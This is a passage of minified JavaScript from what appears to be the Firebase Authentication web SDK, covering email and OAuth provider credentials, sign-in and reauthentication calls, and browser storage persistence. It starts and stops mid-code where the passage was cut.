 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fu extends yv{constructor(e,t,r,i=null){super("password",r),this._email=e,this._password=t,this._tenantId=i}static _fromEmailAndPassword(e,t){return new Fu(e,t,"password")}static _fromEmailAndCode(e,t,r=null){return new Fu(e,t,"emailLink",r)}toJSON(){return{email:this._email,password:this._password,signInMethod:this.signInMethod,tenantId:this._tenantId}}static fromJSON(e){const t=typeof e=="string"?JSON.parse(e):e;if(t!=null&&t.email&&(t!=null&&t.password)){if(t.signInMethod==="password")return this._fromEmailAndPassword(t.email,t.password);if(t.signInMethod==="emailLink")return this._fromEmailAndCode(t.email,t.password,t.tenantId)}return null}async _getIdTokenResponse(e){switch(this.signInMethod){case"password":const t={returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return cI(e,t,"signInWithPassword",I8,"EMAIL_PASSWORD_PROVIDER");case"emailLink":return S8(e,{email:this._email,oobCode:this._password});default:pi(e,"internal-error")}}async _linkToIdToken(e,t){switch(this.signInMethod){case"password":const r={idToken:t,returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return cI(e,r,"signUpPassword",E8,"EMAIL_PASSWORD_PROVIDER");case"emailLink":return T8(e,{idToken:t,email:this._email,oobCode:this._password});default:pi(e,"internal-error")}}_getReauthenticationResolver(e){return this._getIdTokenResponse(e)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function yl(n,e){return Bp(n,"POST","/v1/accounts:signInWithIdp",wa(n,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const A8="http://localhost";class oa extends yv{constructor(){super(...arguments),this.pendingToken=null}static _fromParams(e){const t=new oa(e.providerId,e.signInMethod);return e.idToken||e.accessToken?(e.idToken&&(t.idToken=e.idToken),e.accessToken&&(t.accessToken=e.accessToken),e.nonce&&!e.pendingToken&&(t.nonce=e.nonce),e.pendingToken&&(t.pendingToken=e.pendingToken)):e.oauthToken&&e.oauthTokenSecret?(t.accessToken=e.oauthToken,t.secret=e.oauthTokenSecret):pi("argument-error"),t}toJSON(){return{idToken:this.idToken,accessToken:this.accessToken,secret:this.secret,nonce:this.nonce,pendingToken:this.pendingToken,providerId:this.providerId,signInMethod:this.signInMethod}}static fromJSON(e){const t=typeof e=="string"?JSON.parse(e):e,{providerId:r,signInMethod:i}=t,s=fv(t,["providerId","signInMethod"]);if(!r||!i)return null;const o=new oa(r,i);return o.idToken=s.idToken||void 0,o.accessToken=s.accessToken||void 0,o.secret=s.secret,o.nonce=s.nonce,o.pendingToken=s.pendingToken||null,o}_getIdTokenResponse(e){const t=this.buildRequest();return yl(e,t)}_linkToIdToken(e,t){const r=this.buildRequest();return r.idToken=t,yl(e,r)}_getReauthenticationResolver(e){const t=this.buildRequest();return t.autoCreate=!1,yl(e,t)}buildRequest(){const e={requestUri:A8,returnSecureToken:!0};if(this.pendingToken)e.pendingToken=this.pendingToken;else{const t={};this.idToken&&(t.id_token=this.idToken),this.accessToken&&(t.access_token=this.accessToken),this.secret&&(t.oauth_token_secret=this.secret),t.providerId=this.providerId,this.nonce&&!this.pendingToken&&(t.nonce=this.nonce),e.postBody=ch(t)}return e}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function b8(n){switch(n){case"recoverEmail":return"RECOVER_EMAIL";case"resetPassword":return"PASSWORD_RESET";case"signIn":return"EMAIL_SIGNIN";case"verifyEmail":return"VERIFY_EMAIL";case"verifyAndChangeEmail":return"VERIFY_AND_CHANGE_EMAIL";case"revertSecondFactorAddition":return"REVERT_SECOND_FACTOR_ADDITION";default:return null}}function x8(n){const e=Vc(Fc(n)).link,t=e?Vc(Fc(e)).deep_link_id:null,r=Vc(Fc(n)).deep_link_id;return(r?Vc(Fc(r)).link:null)||r||t||e||n}class wv{constructor(e){var t,r,i,s,o,a;const l=Vc(Fc(e)),u=(t=l.apiKey)!==null&&t!==void 0?t:null,h=(r=l.oobCode)!==null&&r!==void 0?r:null,f=b8((i=l.mode)!==null&&i!==void 0?i:null);Re(u&&h&&f,"argument-error"),this.apiKey=u,this.operation=f,this.code=h,this.continueUrl=(s=l.continueUrl)!==null&&s!==void 0?s:null,this.languageCode=(o=l.languageCode)!==null&&o!==void 0?o:null,this.tenantId=(a=l.tenantId)!==null&&a!==void 0?a:null}static parseLink(e){const t=x8(e);try{return new wv(t)}catch{return null}}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nc{constructor(){this.providerId=nc.PROVIDER_ID}static credential(e,t){return Fu._fromEmailAndPassword(e,t)}static credentialWithLink(e,t){const r=wv.parseLink(t);return Re(r,"argument-error"),Fu._fromEmailAndCode(e,r.code,r.tenantId)}}nc.PROVIDER_ID="password";nc.EMAIL_PASSWORD_SIGN_IN_METHOD="password";nc.EMAIL_LINK_SIGN_IN_METHOD="emailLink";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class T2{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class hh extends T2{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ms extends hh{constructor(){super("facebook.com")}static credential(e){return oa._fromParams({providerId:Ms.PROVIDER_ID,signInMethod:Ms.FACEBOOK_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Ms.credentialFromTaggedObject(e)}static credentialFromError(e){return Ms.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Ms.credential(e.oauthAccessToken)}catch{return null}}}Ms.FACEBOOK_SIGN_IN_METHOD="facebook.com";Ms.PROVIDER_ID="facebook.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ns extends hh{constructor(){super("google.com"),this.addScope("profile")}static credential(e,t){return oa._fromParams({providerId:Ns.PROVIDER_ID,signInMethod:Ns.GOOGLE_SIGN_IN_METHOD,idToken:e,accessToken:t})}static credentialFromResult(e){return Ns.credentialFromTaggedObject(e)}static credentialFromError(e){return Ns.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthIdToken:t,oauthAccessToken:r}=e;if(!t&&!r)return null;try{return Ns.credential(t,r)}catch{return null}}}Ns.GOOGLE_SIGN_IN_METHOD="google.com";Ns.PROVIDER_ID="google.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ps extends hh{constructor(){super("github.com")}static credential(e){return oa._fromParams({providerId:Ps.PROVIDER_ID,signInMethod:Ps.GITHUB_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Ps.credentialFromTaggedObject(e)}static credentialFromError(e){return Ps.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Ps.credential(e.oauthAccessToken)}catch{return null}}}Ps.GITHUB_SIGN_IN_METHOD="github.com";Ps.PROVIDER_ID="github.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ls extends hh{constructor(){super("twitter.com")}static credential(e,t){return oa._fromParams({providerId:Ls.PROVIDER_ID,signInMethod:Ls.TWITTER_SIGN_IN_METHOD,oauthToken:e,oauthTokenSecret:t})}static credentialFromResult(e){return Ls.credentialFromTaggedObject(e)}static credentialFromError(e){return Ls.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthAccessToken:t,oauthTokenSecret:r}=e;if(!t||!r)return null;try{return Ls.credential(t,r)}catch{return null}}}Ls.TWITTER_SIGN_IN_METHOD="twitter.com";Ls.PROVIDER_ID="twitter.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ol{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static async _fromIdTokenResponse(e,t,r,i=!1){const s=await oi._fromIdTokenResponse(e,r,i),o=hI(r);return new Ol({user:s,providerId:o,_tokenResponse:r,operationType:t})}static async _forOperation(e,t,r){await e._updateTokensIfNecessary(r,!0);const i=hI(r);return new Ol({user:e,providerId:i,_tokenResponse:r,operationType:t})}}function hI(n){return n.providerId?n.providerId:"phoneNumber"in n?"phone":null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Md extends gs{constructor(e,t,r,i){var s;super(t.code,t.message),this.operationType=r,this.user=i,Object.setPrototypeOf(this,Md.prototype),this.customData={appName:e.name,tenantId:(s=e.tenantId)!==null&&s!==void 0?s:void 0,_serverResponse:t.customData._serverResponse,operationType:r}}static _fromErrorAndOperation(e,t,r,i){return new Md(e,t,r,i)}}function A2(n,e,t,r){return(e==="reauthenticate"?t._getReauthenticationResolver(n):t._getIdTokenResponse(n)).catch(s=>{throw s.code==="auth/multi-factor-auth-required"?Md._fromErrorAndOperation(n,s,e,r):s})}async function k8(n,e,t=!1){const r=await Vu(n,e._linkToIdToken(n.auth,await n.getIdToken()),t);return Ol._forOperation(n,"link",r)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function C8(n,e,t=!1){const{auth:r}=n;if(ii(r.app))return Promise.reject(ro(r));const i="reauthenticate";try{const s=await Vu(n,A2(r,i,e,n),t);Re(s.idToken,r,"internal-error");const o=gv(s.idToken);Re(o,r,"internal-error");const{sub:a}=o;return Re(n.uid===a,r,"user-mismatch"),Ol._forOperation(n,i,s)}catch(s){throw(s==null?void 0:s.code)==="auth/user-not-found"&&pi(r,"user-mismatch"),s}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function b2(n,e,t=!1){if(ii(n.app))return Promise.reject(ro(n));const r="signIn",i=await A2(n,r,e),s=await Ol._fromIdTokenResponse(n,r,i);return t||await n._updateCurrentUser(s.user),s}async function R8(n,e){return b2(tc(n),e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function M8(n){const e=tc(n);e._getPasswordPolicyInternal()&&await e._updatePasswordPolicy()}function N8(n,e,t){return ii(n.app)?Promise.reject(ro(n)):R8(bn(n),nc.credential(e,t)).catch(async r=>{throw r.code==="auth/password-does-not-meet-requirements"&&M8(n),r})}function P8(n,e,t,r){return bn(n).onIdTokenChanged(e,t,r)}function L8(n,e,t){return bn(n).beforeAuthStateChanged(e,t)}function D8(n,e,t,r){return bn(n).onAuthStateChanged(e,t,r)}function O8(n){return bn(n).signOut()}const Nd="__sak";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class x2{constructor(e,t){this.storageRetriever=e,this.type=t}_isAvailable(){try{return this.storage?(this.storage.setItem(Nd,"1"),this.storage.removeItem(Nd),Promise.resolve(!0)):Promise.resolve(!1)}catch{return Promise.resolve(!1)}}_set(e,t){return this.storage.setItem(e,JSON.stringify(t)),Promise.resolve()}_get(e){const t=this.storage.getItem(e);return Promise.resolve(t?JSON.parse(t):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const B8=1e3,U8=10;class k2 extends x2{constructor(){super(()=>window.localStorage,"LOCAL"),this.boundEventHandler=(e,t)=>this.onStorageEvent(e,t),this.listeners={},this.localCache={},this.pollTimer=null,this.fallbackToPolling=v2(),this._shouldAllowMigration=!0}forAllChangedKeys(e){for(const t of Object.keys(this.listeners)){const r=this.storage.getItem(t),i=this.localCache[t];r!==i&&e(t,i,r)}}onStorageEvent(e,t=!1){if(!e.key){this.forAllChangedKeys((o,a,l)=>{this.notifyListeners(o,l)});return}const r=e.key;t?this.detachListener():this.stopPolling();const i=()=>{const o=this.storage.getItem(r);!t&&this.localCache[r]===o||this.notifyListeners(r,o)},s=this.storage.getItem(r);n8()&&s!==e.newValue&&e.newValue!==e.oldValue?setTimeout(i,U8):i()}notifyListeners(e,t){this.localCache[e]=t;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(t&&JSON.parse(t))}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>{this.forAllChangedKeys((e,t,r)=>{this.onStorageEvent(new StorageEvent("storage",{key:e,oldValue:t,newValue:r}),!0)})},B8)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(e,t){Object.keys(this.listeners).length===0&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[e]||(this.listeners[e]=new Set,this.localCache[e]=this.storage.getItem(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&(this.detachListener(),this.stopPolling())}async _set(e,t){await super._set(e,t),this.localCache[e]=JSON.stringify(t)}async _get(e){const t=await super._get(e);return this.localCache[e]=JSON.stringify(t),t}async _remove(e){await super._remove(e),delete this.localCache[e]}}k2.type="LOCAL";const j8=k2;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class C2 extends x2{constructor(){super(()=>window.sessionStorage,"SESSION")}_addListener(e,t){}_removeListener(e,t){}}C2.type="SESSION";const R2=C2;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function V8(n){return Promise.all(n.map(async e=>{try{return{fulfilled:!0,value:await e}}catch(t){return{fulfilled:!1,reason:t}}}))}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class jp{constructor(e){this.eventTarget=e,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(e){const t=this.receivers.find(i=>i.isListeningto(e));if(t)return t;const r=new jp(e);return this.receivers.push(r),r}isListeningto(e){return this.eventTarget===e}async handleEvent(e){const t=e,{eventId:r,eventType:i,data:s}=t.data,o=this.handlersMap[i];if(!(o!=null&&o.size))return;t.ports[0].postMessage({status:"ack",eventId:r,eventType:i});const a=Array.from(o).map(async u=>u(t.origin,s)),l=await V8(a);t.ports[0].postMessage({status:"done",eventId:r,eventType:i,response:l})}_subscribe(e,t){Object.keys(this.handlersMap).length===0&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[e]||(this.handlersMap[e]=new Set),this.handlersMap[e].add(t)}_unsubscribe(e,t){this.handlersMap[e]&&t&&this.handlersMap[e].delete(t),(!t||this.handlersMap[e].size===0)&&delete this.handlersMap[e],Object.keys(this.handlersMap).length===0&&this.eventTarget.removeEventListener("message",this.boundEventHandler)}}jp.receivers=[];/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function vv(n="",e=10){let t="";for(let r=0;r<e;r++)t+=Math.floor(Math.random()*10);return n+t}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class F8{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}async _send(e,t,r=50){const i=typeof MessageChannel<"u"?new MessageChannel:null;if(!i)throw new Error("connection_unavailable");let s,o;return new Promise((a,l)=>{const u=vv("",20);i.port1.start();const h=setTimeout(()=>{l(new Error("unsupported_event"))},r);o={messageChannel:i,onMessage(f){const m=f;if(m.data.eventId===u)switch(m.data.status){case"ack":clearTimeout(h),s=setTimeout(()=>{l(new Error("timeout"))},3e3);break;case"done":clearTimeout(s),a(m.data.response);break;default:clearTimeout(h),clearTimeout(s),l(new Error("invalid_response"));break}}},this.handlers.add(o),i.port1.addEventListener("message",o.onMessage),this.target.postMessage({eventType:e,eventId:u,data:t},[i.port2])}).finally(()=>{o&&this.removeMessageHandler(o)})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ai(){return window}function z8(n){Ai().location.href=n}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function M2(){return typeof Ai().WorkerGlobalScope<"u"&&typeof Ai().importScripts=="function"}async function W8(){if(!(navigator!=null&&navigator.serviceWorker))return null;try{return(await navigator.serviceWorker.ready).active}catch{return null}}function $8(){var n;return((n=navigator==null?void 0:navigator.serviceWorker)===null||n===void 0?void 0:n.controller)||null}function H8(){return M2()?self:null}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const N2="firebaseLocalStorageDb",q8=1,Pd="firebaseLocalStorage",P2="fbase_key";class fh{constructor(e){this.request=e}toPromise(){return new Promise((e,t)=>{this.request.addEventListener("success",()=>{e(this.request.result)}),this.request.addEventListener("error",()=>{t(this.request.error)})})}}function Vp(n,e){return n.transaction([Pd],e?"readwrite":"readonly").objectStore(Pd)}function K8(){const n=indexedDB.deleteDatabase(N2);return new fh(n).toPromise()}function hy(){const n=indexedDB.open(N2,q8);return new Promise((e,t)=>{n.addEventListener("error",()=>{t(n.error)}),n.addEventListener("upgradeneeded",()=>{const r=n.result;try{r.createObjectStore(Pd,{keyPath:P2})}catch(i){t(i)}}),n.addEventListener("success",async()=>{const r=n.result;r.objectStoreNames.contains(Pd)?e(r):(r.close(),await K8(),e(await hy()))})})}async function fI(n,e,t){const r=Vp(n,!0).put({[P2]:e,value:t});return new fh(r).toPromise()}async function G8(n,e){const t=Vp(n,!1).get(e),r=await new fh(t).toPromise();return r===void 0?null:r.value}function dI(n,e){const t=Vp(n,!0).delete(e);return new fh(t).toPromise()}const Q8=800,Y8=3;class L2{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then(()=>{},()=>{})}async _openDb(){return this.db?this.db:(this.db=await hy(),this.db)}async _withRetries(e){let t=0;for(;;)try{const r=await this._openDb();return await e(r)}catch(r){if(t++>Y8)throw r;this.db&&(this.db.close(),this.db=void 0)}}async initializeServiceWorkerMessaging(){return M2()?this.initializeReceiver():this.initializeSender()}async initializeReceiver(){this.receiver=jp._getInstance(H8()),this.receiver._subscribe("keyChanged",async(e,t)=>({keyProcessed:(await this._poll()).includes(t.key)})),this.receiver._subscribe("ping",async(e,t)=>["keyChanged"])}async initializeSender(){var e,t;if(this.activeServiceWorker=await W8(),!this.activeServiceWorker)return;this.sender=new F8(this.activeServiceWorker);const r=await this.sender._send("ping",{},800);r&&!((e=r[0])===null||e===void 0)&&e.fulfilled&&!((t=r[0])===null||t===void 0)&&t.value.includes("keyChanged")&&(this.serviceWorkerReceiverAvailable=!0)}async notifyServiceWorker(e){if(!(!this.sender||!this.activeServiceWorker||$8()!==this.activeServiceWorker))try{await this.sender._send("keyChanged",{key:e},this.serviceWorkerReceiverAvailable?800:50)}catch{}}async _isAvailable(){try{if(!indexedDB)return!1;const e=await hy();return await fI(e,Nd,"1"),await dI(e,Nd),!0}catch{}return!1}async _withPendingWrite(e){this.pendingWrites++;try{await e()}finally{this.pendingWrites--}}async _set(e,t){return 